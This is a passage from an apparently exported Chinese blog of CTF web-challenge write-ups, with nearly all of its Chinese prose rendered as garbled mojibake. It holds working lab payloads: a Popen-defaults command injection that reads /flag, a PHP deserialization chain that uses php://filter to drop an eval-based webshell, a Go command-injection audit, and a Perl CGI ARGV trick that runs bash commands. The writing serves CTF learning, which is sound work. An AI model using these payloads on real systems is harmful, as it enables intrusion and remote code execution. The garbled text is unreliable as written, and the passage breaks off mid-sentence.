·çš„ï¼Œå¯ä»¥è¿›è¡Œå‘½ä»¤æ³¨å…¥ã€‚è€Œå½“shellä¸ºfalseæ—¶ï¼Œæ‰§è¡Œå‘½ä»¤æ—¶æ˜¯/bin/cmd argè¿™ç§ã€‚è€Œè¿™ä¸ªæ–¹æ³•çš„shellå‚æ•°é»˜è®¤ä¸ºfalseã€‚ å› æ­¤æˆ‘ä»¬è¦ä»¤shellä¸ºtrueæ‰å¯ä»¥ï¼Œè¿™é‡Œå°±æ˜¯æƒ³åŠæ³•ä¿®æ”¹å…¶å¸ƒå°”å€¼äº† æ ¹æ®å‡½æ•°çš„é»˜è®¤å‚æ•°ä¿å­˜åœ¨defaultså±æ€§ä¸­ï¼Œæˆ‘ä»¬åœ¨ç»ˆç«¯çœ‹ä¸€ä¸‹å…¶ä½ç½® å¦‚ä¸Šå›¾å¯ä»¥çœ‹åˆ°ä½ç½®åœ¨ç¬¬å…«ä¸ªï¼Œä¹Ÿå°±æ˜¯ä¸‹æ ‡ä¸º7ï¼Œæˆ‘ä»¬ç»™numèµ‹å€¼ä¸º7å³å¯ æˆ‘ä»¬æ„é€ å¦‚ä¸‹payloadï¼Œæ³¨ï¼šjsonæ ¼å¼ï¼Œbolä¸ºå­—ç¬¦ä¸²ï¼Œexpçš„æ ¼å¼ä¸ºæ•°ç»„ï¼ˆç”¨æ¥è¢«gettéå†ï¼‰ { \"exp\":[ \"Popen\", \"__init__\", \"__default__\" ] } getä¼ å‚ï¼š?num=7&amp;bol=true&amp;shell=mkdir%20./static;cat%20/flag&gt;./static/1.txt&amp;exec=oka æ¥ä¸‹æ¥ä»¤execä¸ä¸ºokå³å¯è¿›å…¥elseè¯­å¥â€“è¿™é‡Œæ³¨æ„content-typeçš„å†…å®¹ ä¸‹é¢è¦getä¼ å‚ï¼Œä»¤exec=okè¿›å…¥cmdå‘½ä»¤æ‰§è¡ŒçŠ¶æ€ æ‹¿åˆ°flag [WEEK3]å¿«é—®å¿«ç­” ç›´æ¥çœ‹é¢˜ç›®æºç ï¼Œå¾ˆæ˜æ˜¾æ˜¯è¦å†™è„šæœ¬çš„ï¼Œç”±äºæœ¬äººå¤ªèœï¼Œæ‰€ä»¥å°±è·Ÿç€åˆ«çš„ä½¬å»å†™äº†ã€‚ import requests import re import time def post_answer(url, headers, answer, cookie):#å‘é€è¯·æ±‚ answer1 = {'answer': answer} response=requests.Session() response = response.post(url, headers=headers, data=answer1,cookies=cookie)#è¿™ä¸ªéœ€è¦è®¾cookieï¼Œå› ä¸ºæ¯é“é¢˜çš„cookieéƒ½æ˜¯ä¸åŒçš„ return response def parse_question(response):#ç”¨äºè®¡ç®—ç­”æ¡ˆ html = response.text answer=0 pattern = re.compile(r\"&lt;h3&gt;(.*?)&lt;/h3&gt;\")#(.*?)ï¼šè¿™æ˜¯æ­£åˆ™è¡¨è¾¾å¼çš„ä¸€éƒ¨åˆ†ï¼Œç”¨äºæ•è·ä»»ä½•å­—ç¬¦ï¼ˆé™¤äº†æ¢è¡Œç¬¦ ï¼‰é›¶æ¬¡æˆ–å¤šæ¬¡ï¼Œéè´ªå©ªåœ°åŒ¹é…ï¼Œå…¶ä¸­çš„ræ˜¯ä¸ºäº†è®©å…¶ä¸­çš„åæ–œæ å­—ç¬¦è§†ä¸ºæ™®é€šå­—ç¬¦ match = pattern.search(html) if match: question = match.group(1) numbers = re.findall(r\"\\d+\", question) operation = re.findall(r'å¼‚æˆ–|ä¸|\\+|-|x|Ã·', question)#è¯†åˆ«è¿ç®—ç¬¦ op=operation[0] if len(numbers) == 2: a = int(numbers[0]) b = int(numbers[1]) if op == \"å¼‚æˆ–\": answer = a ^ b if op == \"ä¸\": answer = a &amp; b if op == \"-\": answer = a - b if op == \"+\": answer = a + b if op == \"x\": answer = a * b if op == \"Ã·\": answer = int(a/b)#è¿™é‡Œè¦ç‰¹åˆ«æ³¨æ„è¦å¼ºè½¬æˆæ•´å½¢ï¼Œå› ä¸ºé¢˜ç›®åªèƒ½æäº¤æ•´æ•°ï¼Œå¦‚æœä¸è½¬ï¼Œè„šæœ¬è¿è¡Œçš„æ—¶å€™ï¼Œä¼šå› ä¸ºæäº¤æ— æ•ˆæ•°æ®è€Œçˆ†500çš„é”™è¯¯ #print(question) #print(answer) else: print(\"æ‰¾ä¸åˆ°é¢˜ç›®\") return answer url = \"http://112.6.51.212:32776/\" # è¿™é‡Œæ›¿æ¢ä¸ºä½ è¦è®¿é—®çš„ç½‘å€ headers = {\"Content-Type\": \"application/x-www-form-urlencoded\"} cookie=0 answer = 0 for i in range(1,52):#è¿™é‡Œè¦è®¾ç½®æˆ52ï¼Œç›¸å½“äºå¾ªç¯äº†51æ¬¡ï¼Œå› ä¸ºç¬¬ä¸€æ¬¡æ˜¯åˆå§‹åŒ–ï¼Œç­”æ¡ˆæ˜¯é”™çš„ time.sleep(1)#è¿™é‡Œæ˜¯ä¸ºäº†åˆ«è®©ç¨‹åºç­”å¾—å¤ªå¿«ï¼Œå› ä¸ºé¢˜ç›®ç­”é¢˜é€Ÿåº¦æ˜¯1åˆ°2ç§’ä¹‹é—´ response = post_answer(url, headers, answer, cookie) print(response.text)#æ‰“å°è¡¨å• answer = parse_question(response) cookie = response.cookies æ‹¿åˆ°flagï¼Œæ„Ÿè§‰è¿™ä¸ªè„šæœ¬è¿˜æ˜¯æœ‰éš¾åº¦çš„ã€‚ã€‚ã€‚ã€‚æˆ‘å…ˆç»ƒä¹ ä¸€æ³¢ ä¹‹ååˆç ”ç©¶äº†ä¸€æ³¢ä»£ç ï¼Œå‘ç°match.group(1)æ­¤å¤„æ˜¯å¿…é¡»ä¸º1çš„ï¼Œå¦‚æœä¸º0è¾“å‡ºå¦‚ä¸‹ï¼šå¾ˆæ˜æ˜¾ä¼šå¯¼è‡´æˆ‘ä»¬åç»­å¯¹æ•°å­—çš„åˆ¤æ–­é”™è¯¯ [WEEK3]sseerriiaalliizzee &lt;?php error_reporting(0); highlight_file(__FILE__); class Start{ public $barking; public function __construct(){ $this-&gt;barking = new Flag; } public function __toString(){ return $this-&gt;barking-&gt;dosomething(); } } class CTF{ public $part1; public $part2; public function __construct($part1='',$part2='') { $this -&gt; part1 = $part1; $this -&gt; part2 = $part2; } public function dosomething(){ $useless = '&lt;?php die(\"+Genshin Impact Start!+\");?&gt;'; $useful= $useless. $this-&gt;part2; file_put_contents($this-&gt; part1,$useful); } } class Flag{ public function dosomething(){ include('./flag,php'); return \"barking for fun!\"; } } $code=$_POST['code']; if(isset($code)){ echo unserialize($code); } else{ echo \"no way, fuck off\"; } ?&gt; no way, fuck off è¿™é“é¢˜ç›®é“¾å­å¾ˆå®¹æ˜“åˆ†æï¼Œtostringé­”æœ¯æ–¹æ³•çš„è°ƒç”¨åœ¨echo ååºåˆ—åŒ–å¤„å°±ä¼šè°ƒç”¨çš„ï¼Œéš¾ç‚¹æ˜¯åˆ©ç”¨ç‚¹åœ¨CTFç±»ä¸­çš„$useful= $useless. $this-&gt;part2;å¤„ï¼Œä½†æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä»–ä¹‹å‰æ˜¯æœ‰ä¸€ä¸ªå†…å®¹ä¸ºphpä»£ç ï¼Œå…¶ä¸­å«æœ‰dieï¼Œè¿™ä¼šå¯¼è‡´ç¨‹åºçš„ç›´æ¥é€€å‡ºã€‚æ­¤æ—¶è®©æˆ‘æƒ³åˆ°äº†PHPçš„æ­»äº¡dieç»•è¿‡ï¼Œè®°å¾—pç¥è®²è¿‡çš„ï¼š è°ˆä¸€è°ˆphp://filterçš„å¦™ç”¨â€“æˆ‘åªèƒ½è¯´è®²å¾—çœŸé€šä¿—æ˜“æ‡‚ï¼Œè¿™é‡Œæˆªå–å…³é”®éƒ¨åˆ† å¹¸è¿çš„æ˜¯ï¼Œè¿™é‡Œçš„$_POST['filename']æ˜¯å¯ä»¥æ§åˆ¶åè®®çš„ï¼Œæˆ‘ä»¬å³å¯ä½¿ç”¨ php://filteråè®®æ¥æ–½å±•é­”æ³•ï¼šä½¿ç”¨php://filteræµçš„base64-decodeæ–¹æ³•ï¼Œå°†$contentè§£ç ï¼Œåˆ©ç”¨php base64_decodeå‡½æ•°ç‰¹æ€§å»é™¤â€œæ­»äº¡exitâ€ã€‚ ä¼—æ‰€å‘¨çŸ¥ï¼Œbase64ç¼–ç ä¸­åªåŒ…å«64ä¸ªå¯æ‰“å°å­—ç¬¦ï¼Œè€ŒPHPåœ¨è§£ç base64æ—¶ï¼Œé‡åˆ°ä¸åœ¨å…¶ä¸­çš„å­—ç¬¦æ—¶ï¼Œå°†ä¼šè·³è¿‡è¿™äº›å­—ç¬¦ï¼Œä»…å°†åˆæ³•å­—ç¬¦ç»„æˆä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²è¿›è¡Œè§£ç ã€‚ æ‰€ä»¥ï¼Œä¸€ä¸ªæ­£å¸¸çš„base64_decodeå®é™…ä¸Šå¯ä»¥ç†è§£ä¸ºå¦‚ä¸‹ä¸¤ä¸ªæ­¥éª¤ï¼š &lt;?php $_GET['txt'] = preg_replace('|[^a-z0-9A-Z+/]|s', '', $_GET['txt']); base64_decode($_GET['txt']); æ‰€ä»¥ï¼Œå½“$contentè¢«åŠ ä¸Šäº†&lt;?php exit; ?&gt;ä»¥åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ php://filter/write=convert.base64-decode æ¥é¦–å…ˆå¯¹å…¶è§£ç ã€‚åœ¨è§£ç çš„è¿‡ç¨‹ä¸­ï¼Œå­—ç¬¦&lt;ã€?ã€;ã€&gt;ã€ç©ºæ ¼ç­‰ä¸€å…±æœ‰7ä¸ªå­—ç¬¦ä¸ç¬¦åˆbase64ç¼–ç çš„å­—ç¬¦èŒƒå›´å°†è¢«å¿½ç•¥ï¼Œæ‰€ä»¥æœ€ç»ˆè¢«è§£ç çš„å­—ç¬¦ä»…æœ‰â€œphpexitâ€å’Œæˆ‘ä»¬ä¼ å…¥çš„å…¶ä»–å­—ç¬¦ã€‚ â€œphpexitâ€ä¸€å…±7ä¸ªå­—ç¬¦ï¼Œå› ä¸ºbase64ç®—æ³•è§£ç æ—¶æ˜¯4ä¸ªbyteä¸€ç»„ï¼Œæ‰€ä»¥ç»™ä»–å¢åŠ 1ä¸ªâ€œaâ€ä¸€å…±8ä¸ªå­—ç¬¦ã€‚è¿™æ ·ï¼Œ\"phpexita\"è¢«æ­£å¸¸è§£ç ï¼Œè€Œåé¢æˆ‘ä»¬ä¼ å…¥çš„webshellçš„base64å†…å®¹ä¹Ÿè¢«æ­£å¸¸è§£ç ã€‚ç»“æœå°±æ˜¯&lt;?php exit; ?&gt;æ²¡æœ‰äº†ã€‚ æ ¹æ®ä¸Šè¿°ç†è®ºæˆ‘ä»¬çœ‹ä¸€ä¸‹&lt;?php die(\"+Genshin Impact Start!+\");?&gt;åœ¨ç»è¿‡base64è§£ç çš„æ—¶å€™ä¼šå°†&lt;ã€?ã€;ã€(ã€)å¿½ç•¥ï¼Œä¹Ÿå°±æ˜¯è¯´æœ€ååªå‰©ä¸‹phpdie+GenshinImpactStart+å…±26ä¸ªå­—ç¬¦ï¼Œè€ƒè™‘åˆ°base64ç‰¹æ€§æˆ‘ä»¬éœ€è¦å¢æ·»ä¸¤ä¸ªå­—ç¬¦ä½¿å…¶ä¸º4çš„å€æ•°ä¹Ÿå°±æ˜¯28ï¼Œæœ€ç»ˆpayloadå¦‚ä¸‹ï¼š &lt;?php class Start{ public $barking; } class CTF{ public $part1; public $part2; } $poc = new Start(); $poc-&gt;barking = new CTF(); $poc-&gt;barking-&gt;part1 = 'php://filter/write=convert.base64-decode/resource=cmd.php'; $poc-&gt;barking-&gt;part2 = 'aaPD9waHAgQGV2YWwoJF9QT1NUWydoeWJjeCddKTs/Pg=='; //æ³¨æ„è¿™é‡Œå‰é¢æœ‰ä¸¤ä¸ªå­—ç¬¦aa echo serialize($poc); ?&gt; ä¸Šä¼ è®¿é—®å³å¯ æ‹¿åˆ°flag å¦å¤–çš„å„ç§å§¿åŠ¿è¿˜å¯å‚è€ƒï¼šfile_put_contentsåˆ©ç”¨æŠ€å·§(php://filteråè®®) [WEEK3]gogogo è¿™é“é¢˜æ ¹æ®é™„ä»¶æ¥çœ‹æ˜¯ä¸€é“goè¯­è¨€å®¡è®¡é¢˜ç›®ï¼Œè¿™ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡é‡è§ã€‚ã€‚ã€‚å…ˆè‡ªå·±å®¡è®¡ä¸€æ³¢ main.go package main import ( \"main/route\" \"github.com/gin-gonic/gin\" ) func main() { r := gin.Default() r.GET(\"/\", route.Index) r.GET(\"/readflag\", route.Readflag) r.Run(\"0.0.0.0:8000\") } route.go package route import ( \"github.com/gin-gonic/gin\" \"github.com/gorilla/sessions\" \"main/readfile\" \"net/http\" \"os\" \"regexp\" ) var store = sessions.NewCookieStore([]byte(os.Getenv(\"SESSION_KEY\"))) func Index(c *gin.Context) { session, err := store.Get(c.Request, \"session-name\") if err != nil { http.Error(c.Writer, err.Error(), http.StatusInternalServerError) return } if session.Values[\"name\"] == nil { session.Values[\"name\"] = \"User\" err = session.Save(c.Request, c.Writer) if err != nil { http.Error(c.Writer, err.Error(), http.StatusInternalServerError) return } } c.String(200, \"Hello, User. How to become admin?\") } func Readflag(c *gin.Context) { session, err := store.Get(c.Request, \"session-name\") if err != nil { http.Error(c.Writer, err.Error(), http.StatusInternalServerError) return } if session.Values[\"name\"] == \"admin\" { c.String(200, \"Congratulation! You are admin,But how to get flag? \") path := c.Query(\"filename\") reg := regexp.MustCompile(`[b-zA-Z_@#%^&amp;*:{|}+&lt;&gt;\";\\[\\]]`) if reg.MatchString(path) { http.Error(c.Writer, \"nonono\", http.StatusInternalServerError) return } var data []byte if path != \"\" { data = readfile.ReadFile(path) } else { data = []byte(\"è¯·ä¼ å…¥å‚æ•°\") } c.JSON(200, gin.H{ \"success\": \"read: \" + string(data), }) } else { c.String(200, \"Hello, User. How to become admin?\") } } readfile.go package readfile import ( \"os/exec\" ) func ReadFile(path string) (string2 []byte) { defer func() { panic_err := recover() if panic_err != nil { } }() cmd := exec.Command(\"bash\", \"-c\", \"strings \"+path) string2, err := cmd.Output() if err != nil { string2 = []byte(\"æ–‡ä»¶ä¸å­˜åœ¨\") } return string2 } çœ‹äº†ä¸€æ³¢æ„Ÿè§‰æ˜¯sessionä¼ªæ„é€ ï¼Œå…¶ä¸­è¦æ±‚æˆ‘ä»¬çš„nameä¸ºadminæ‰èƒ½æœ‰è¯»å–flagçš„æƒé™ï¼Œä½†æ˜¯session.nameæ˜¯åŠ å¯†è¿‡çš„ï¼š var store = sessions.NewCookieStore([]byte(os.Getenv(\"SESSION_KEY\"))) è¿™é‡Œçœ‹åˆ°æ˜¯ä»¥session_keyå¯†é’¥åŠ å¯†ï¼Œè¿™æ—¶å€™ç¥å¥‡çš„æ€è·¯å°±æ¥äº†ï¼Œä½¬ä»¬éƒ½ç›´æ¥ç›²çŒœé¢˜ç›®æ²¡æœ‰è¯¥ç¯å¢ƒå˜é‡ï¼Œäºæ˜¯æƒ³ç€ç›´æ¥æ­å»ºåˆ°æœ¬åœ°è¿è¡Œå¾—åˆ°sessionï¼Œåœ¨æ­¤ä¹‹å‰æˆ‘ä»¬çœ‹ä¸€ä¸‹è¿™ä¸ª å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å½“å‰çš„nameä¸ºUseræ ¹æ®ä¸Šè¿°indexå¤„çš„ä»£ç æˆ‘ä»¬çŸ¥é“å½“name=nilçš„æ—¶å€™ï¼Œæ‰ä¼šèµ‹å€¼ä¸ºUserï¼Œè¿™è¯´æ˜åœ¨æ­¤ä¹‹å‰æˆ‘ä»¬çš„nameä¸€å®šæ˜¯nilï¼Œæ­¤æ—¶å¦‚æœæˆ‘ä»¬ä¿®æ”¹è¿™ä¸ªä»£ç  session.Values[\"name\"] = \"User\" æ”¹ä¸º session.Values[\"name\"] = \"admin\" é‚£æ­¤æ—¶è¿è¡Œå®Œä¹‹åæˆ‘ä»¬çš„session.nameä¸€å®šæ˜¯adminï¼Œæ€è·¯æ‰“é€šäº†ï¼Œé‚£ç›´æ¥æœ¬åœ°æ­å»ºå³å¯ è¿™é‡Œä¹Ÿæ˜¯æ­å»ºäº†å¾ˆé•¿æ—¶é—´ï¼Œä¸€ç›´æŠ¥é”™ã€‚ã€‚ã€‚ä½†åŠŸå¤«ä¸è´Ÿæœ‰å¿ƒäººè¿˜æ˜¯æ­å»ºå¥½äº† MTY5ODc2Mjk1NHxEWDhFQVFMX2dBQUJFQUVRQUFBaV80QUFBUVp6ZEhKcGJtY01CZ0FFYm1GdFpRWnpkSEpwYm1jTUJnQUVWWE5sY2c9PXwIajflC8tQIWBj_C6y_TRCb3QZo-mQ9nhVjtatkQ3nbg== MTY5ODc1NDk2OHxEdi1CQkFFQ180SUFBUkFCRUFBQUl2LUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBWUFCRlZ6WlhJPXzzzlJr4E_S8XnoBRbpogEHKAVkSrz_YsNvqNpca0wA6g== MTY5ODc2Mjk1NHxEWDhFQVFMX2dBQUJFQUVRQUFBaV80QUFBUVp6ZEhKcGJtY01CZ0FFYm1GdFpRWnpkSEpwYm1jTUJnQUVWWE5sY2c9PXwIajflC8tQIWBj_C6y_TRCb3QZo-mQ9nhVjtatkQ3nbg== æˆ‘ä»¬è®¿é—®127.0.0.1:8000å¾—åˆ°sessionï¼Œå¦‚ä¸Šæ‰€ç¤ºï¼Œæœ€åçœ‹ä¸€ä¸‹readfileå‡½æ•° è¿™é‡Œçœ‹äº†wpå‘ç°filenameæ˜¯getä¼ å‚ï¼Œç„¶åæ˜¯ä¸€ä¸ªæ­£åˆ™è¿‡æ»¤ MISC ç­¾åˆ°é¢˜ å‘ç°æ˜¯base128ï¼Œä¸¤æ¬¡base64è§£ç å³å¯","tags":["CTFèµ›äº‹"],"categories":["CTFèµ›äº‹"]},{"title":"i-got-id-200","path":"/2023/10/01/i-got-id-200/","content":"é¢˜ç›®æè¿° csaw-å—¯ã€‚ã€‚æˆ‘åˆšå»ºå¥½äº†ä¸€ä¸ªç½‘ç«™ é¢˜ç›®è§£é¢˜ è®¿é—®é¦–é¡µæ˜¯ä¸‰ä¸ªé“¾æ¥ ï¼Œç‚¹å‡»æŸ¥çœ‹å‘ç°åªæœ‰ç¬¬äºŒä¸ªå’Œç¬¬ä¸‰ä¸ªæœ‰åˆ©ç”¨çš„å¯èƒ½ï¼Œç¬¬äºŒä¸ªä¸ºä¸€äº›æ–‡æœ¬æ¡† ç¬¬ä¸‰ä¸ªä¸ºæ–‡ä»¶ä¸Šä¼  è¿™é‡Œæ–‡æœ¬æ¡†ä¸çŸ¥é“æœ‰å•¥åˆ©ç”¨çš„ï¼ˆæµ‹è¯•äº†åŠå¤©ï¼‰ äºæ˜¯çœ‹ä¸€ä¸‹æ–‡ä»¶ä¸Šä¼ ï¼Œé¦–å…ˆä¸Šä¼ phpæ²¡ååº”ï¼Œé‚£ä¸Šä¼ æ™®é€šçš„çœ‹çœ‹ æµ‹è¯•å‡ ç•ªå‘ç°åªè¦æ˜¯æ™®é€šæ–‡ä»¶ä»¥åŠæ™®é€šå†…å®¹ï¼ˆå³ä¸åŒ…å«æœ¨é©¬ä»€ä¹ˆçš„ï¼‰é‚£è¯¥æ–‡ä»¶å†…å®¹æ˜¯ä»€ä¹ˆï¼Œé¡µé¢å°±ä¼šæ˜¾ç¤ºä»€ä¹ˆ å†è€…çœ‹äº†çœ‹urlå‘ç°æ¯ä¸ªé¡µé¢éƒ½æœ‰.plåç¼€ï¼Œç™¾åº¦å‘ç°è¿™ä»£è¡¨çš„æ˜¯perlè¯­è¨€æ–‡ä»¶ã€‚ä½†æ— å¥ˆèœé¸¡çš„æˆ‘å¯¹æ­¤ä¸æ‡‚ï¼Œåªèƒ½è·Ÿç€ä½¬çš„wpèµ°äº† é¦–å…ˆæŠ“åŒ…ä»¥æ–¹ä¾¿æµ‹è¯•ï¼Œæ¥ä¸Šå›ï¼Œç”±äºé¡µé¢å›æ˜¾çš„å°±æ˜¯æ–‡ä»¶æ‰€å†™çš„å†…å®¹ï¼Œå› æ­¤æŸäº›å¤§ç¥å°±ç›´æ¥çŒœåˆ°äº†åå°ä»£ç ï¼Œè¿™é‡Œå…ˆé™„ä¸Šï¼š use strict; use warnings; use CGI; my $cgi= CGI-&gt;new; if ( $cgi-&gt;upload( 'file' ) ) { my $file= $cgi-&gt;param( 'file' ); while ( &lt;$file&gt; ) { print \"$_\"; } } å› ä¸ºå®ƒä¼šå°†ä¸Šä¼ çš„æ–‡ä»¶å†…å®¹æ‰“å°å‡ºæ¥ï¼Œæ‰€ä»¥çŒœæµ‹åå°å­˜åœ¨param()å‡½æ•°ã€‚param()å‡½æ•°ä¼šè¿”å›ä¸€ä¸ªåˆ—è¡¨çš„æ–‡ä»¶ä½†æ˜¯åªæœ‰ç¬¬ä¸€ä¸ªæ–‡ä»¶ä¼šè¢«æ”¾å…¥åˆ°ä¸‹é¢çš„fileå˜é‡ä¸­ã€‚ å¦‚æœæˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªARGVçš„æ–‡ä»¶ï¼Œé‚£ä¹ˆPerlä¼šå°†ä¼ å…¥çš„å‚æ•°ä½œä¸ºæ–‡ä»¶åè¯»å‡ºæ¥ã€‚å¯¹æ­£å¸¸çš„ä¸Šä¼ æ–‡ä»¶è¿›è¡Œä¿®æ”¹,å¯ä»¥è¾¾åˆ°è¯»å–ä»»æ„æ–‡ä»¶çš„ç›®çš„ã€‚æˆ‘ä»¬ä¸çŒœä»£ç ï¼Œä¸€æ­¥æ­¥æ¥ï¼š å¤åˆ¶ä¸‹é¢ä¸€éä»£ç ï¼Œå°†filenameåˆ å»ï¼Œå†…å®¹ä¿®æ”¹ä¸ºARGVï¼Œè¯»å–file.plçœ‹çœ‹æœ‰ä»€ä¹ˆï¼ˆå°±çŒœå®ƒåœ¨/var/www/cgi-bin/ä¸‹ï¼ï¼‰åŒæ—¶ä¿®æ”¹POSTåœ°å€åçš„å‚æ•°ï¼Œä½œä¸ºè¦è¯»å–çš„æ–‡ä»¶ï¼Œå¦‚å›¾ï¼š æˆ‘ä¹ˆå¯ä»¥çœ‹åˆ°å›æ˜¾æºç ï¼Œæœç„¶éªŒè¯äº†æœ‰param()å‡½æ•°çš„çŒœæƒ³ã€‚ åˆ©ç”¨bashè¯»å–ä¸€ä¸‹ä¸»ç›®å½•æœ‰å•¥æ–‡ä»¶ /cgi-bin/file.pl?/bin/bash%20-c%20ls${IFS}/| %20æ˜¯ç©ºæ ¼ï¼ŒåŸå§‹å‘½ä»¤ä¸ºï¼š/cgi-bin/file.pl?/bin/bash -c ls${IFS}/|ï¼Œä¸ºä»€ä¹ˆè¿™ä¹ˆæ„é€ ï¼Ÿåé¢æœ‰è§£é‡Šï¼Œå…ˆçœ‹æ•ˆæœï¼š çœ‹åˆ°flagï¼Œç›´æ¥è¯»å– ç–‘ç‚¹å›é¡¾ ä½•ä¸º/bin/bash -cï¼Ÿ /bin/bash -cè¡¨ç¤ºæŒ‡å®šå°†å‘½ä»¤è½¬ä¸ºä¸€ä¸ªå®Œæ•´å‘½ä»¤æ‰§è¡Œï¼Œå¯ä»¥ç†è§£ä¸ºæ‰§è¡Œlinuxå‘½ä»¤ ä¾‹ï¼š ä½•ä¸º${IFS}ï¼Ÿ IFSæ˜¯shellçš„ç‰¹æ®Šç¯å¢ƒå˜é‡,æ˜¯Linuxä¸‹çš„å†…éƒ¨åŒºåŸŸåˆ†éš”ç¬¦ã€‚IFSä¸­å­˜å‚¨çš„å€¼å¯ä»¥æ˜¯ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢è¡Œç¬¦æˆ–è€…å…¶ä»–è‡ªå®šä¹‰ç¬¦å·ï¼Œå¯ä»¥åœ¨linuxä¸­ä½¿ç”¨${IFS}ä»£æ›¿ç©ºæ ¼ ä¾‹ï¼š ä¸ºä»€ä¹ˆè¦åŠ |ï¼Ÿ |ï¼šç®¡é“ç¬¦å·¦è¾¹å‘½ä»¤çš„è¾“å‡ºå°±ä¼šä½œä¸ºç®¡é“ç¬¦å³è¾¹å‘½ä»¤çš„è¾“å…¥ï¼Œè¿™é‡Œä¸ºä»€ä¹ˆè¦åŠ æˆ‘ä¹Ÿæ²¡ææ˜ç™½ï¼Œå¦‚æœ‰çŸ¥é“çš„æœ‹å‹è¯„è®ºå‘Šè¯‰æˆ‘ï¼Œè°¢è°¢ã€‚ ä¸¾ä¾‹ä¸€ä¸ªå¸¸è§çš„ç”¨æ³•å§ï¼šcatåè¾“å‡ºçš„å†…å®¹ï¼Œä½œä¸º|åé¢å†…å®¹çš„è¾“å…¥ï¼Œè¿™é‡Œæ˜¯äº¤ç»™grepæ‰§è¡Œï¼ˆæ­¤å¤„åœ¨åé¢æœ‰è§£é‡Šï¼‰ æ³¨ï¼šç»æµ‹è¯•ï¼Œ${IFS}å’Œ/bin/bashè”ç”¨æ—¶ï¼Œä¸ä»£è¡¨ç©ºæ ¼ è‡ªè¡Œåšæµ‹è¯•åå‘ç°${IFS}è¢«è¯†åˆ«ä¸ºæ ¹ç›®å½•ç¬¦å·ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆä¼šè¿™ä¹ˆè¯†åˆ«ï¼Œå¦å¤–ç®¡é“ç¬¦|ï¼Œæˆ‘è®¤è¯†æ˜¯éœ€è¦å°†å†…å®¹ä½œä¸ºARGVçš„è¾“å…¥æ‰“åŒ…ï¼Œç”¨äºæ˜¾ç¤ºå‡ºæŸ¥æ‰¾çš„å†…å®¹ä¸ªã€‚ æ¼æ´åˆ†æ è¿™é‡Œå¤§ä½¬å‘Šè¯‰æˆ‘ä»¬è¦åˆ©ç”¨@ARGVè¿™ä¸ªå…¨å±€å˜é‡ é¦–å…ˆè¦äº†è§£Perlä¸­çš„ARGVå…¨å±€ç‰¹æ®Šæ–‡ä»¶å¥æŸ„ ARGVï¼šéå†æ•°ç»„å˜é‡@ARGVä¸­æ‰€æœ‰æ–‡ä»¶åçš„ç‰¹æ®Šæ–‡ä»¶å¥æŸ„ @ARGVï¼šæ˜¯ä¸ªå…¨å±€æ•°ç»„ç‰¹æ®Šå˜é‡ï¼Œä¼ ç»™è„šæœ¬çš„å‘½ä»¤è¡Œå‚æ•°åˆ—è¡¨ Perl ä¼šå°† perl å‘½ä»¤è¡Œå‚æ•°åˆ—è¡¨æ”¾å…¥åˆ°æ•°ç»„ @ARGV ä¸­ï¼Œè€Œé»˜è®¤æƒ…å†µä¸‹ï¼Œè¿™äº›å‘½ä»¤è¡Œå‚æ•°æ˜¯ Perl çš„æ•°æ®è¾“å…¥æºï¼Œä¹Ÿå°±æ˜¯ è¯´Perl ä¼šä¾æ¬¡å°†ä»–ä»¬å½“ä½œæ–‡ä»¶è¿›è¡Œè¯»å–ã€‚è¿™é‡Œå¯ä»¥å‚è€ƒCè¯­è¨€çš„argv{}æ•°ç»„ï¼Œä½†ä¸åŒçš„æ˜¯ï¼ŒPerlè¯­è¨€çš„@ARGVä¸­çš„ç¬¬ä¸€ä¸ªå˜é‡å°±æ˜¯å‚æ•°ï¼Œè€Œä¸æ˜¯æ–‡ä»¶åã€‚ Param() å‡½æ•°ä¼šè¿”å›ä¸€ä¸ªåˆ—è¡¨ï¼Œä½†åªæœ‰ç¬¬ä¸€ä¸ªæ–‡ä»¶ä¼šè¢«æ”¾åˆ°å˜é‡ä¸­ã€‚ å¢åŠ æ–°çš„ä¸Šä¼ é¡¹ï¼Œå¹¶åˆ é™¤filenameï¼Œé‡å¤§æ¼æ´æ¥äº† åˆ é™¤filenameåï¼Œ $fileçš„å€¼ï¼ˆä¹Ÿå°±æ˜¯æ–‡ä»¶åï¼‰å˜ä¸ºäº†ä¸Šä¼ çš„å†…å®¹ï¼Œè€Œè¾“å‡ºçš„æ–‡ä»¶å†…å®¹ä¸ºç©º é€šä¿—ç†è§£å°±æ˜¯ï¼Œæ–°åŠ å…¥çš„æ–‡ä»¶å†…å®¹æ›¿æ¢äº†filenameå‚æ•°ï¼Œä¼ ç»™äº†$fileå˜é‡ï¼Œå¥æŸ„ä¸­æ‰“å¼€æ–‡ä»¶å†…å®¹ä¸ºç©º é‚£å¦‚æœæˆ‘ä»¬åˆ©ç”¨@ARGVï¼Œå°†$fileæ›¿æ¢ä¸º@ARGVï¼Œå…¶å¥æŸ„å°±æ˜¯å‘½ä»¤è¡Œçš„å‚æ•°ï¼Œ å¦‚æœç»™çš„å‚æ•°æ˜¯æ–‡ä»¶åï¼Œå°±å¯ä»¥è¾“å‡ºç¬¬ä¸€ä¸ªæ–‡ä»¶åçš„æ‰€æœ‰å†…å®¹ã€‚ è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨ä»¥ä¸Šä¿¡æ¯æ„é€ ï¼ŒåŠ å…¥æ–°çš„æ–‡ä»¶åˆ—è¡¨ï¼Œåˆ é™¤filenameï¼Œæ–‡ä»¶å†…å®¹å†™å…¥ARGV é‚£ä¹ˆåç«¯æ‰§è¡Œï¼Œå°±ä¼šæŠŠ$fileçš„å€¼æ¢ä¸ºARGVï¼Œä¹Ÿå°±æˆäº†ä¸Šè¿°test.plçš„å†…å®¹ï¼Œä¼šæŠŠä»å‘½ä»¤è¡Œé‡Œè¯»å–åˆ°çš„å‚æ•°ï¼Œå½“ä½œæ–‡ä»¶è·¯å¾„æ‰¾åˆ°å¹¶è¾“å‡ºã€‚ é‚£ä¹ˆå¦‚ä½•ä¼ 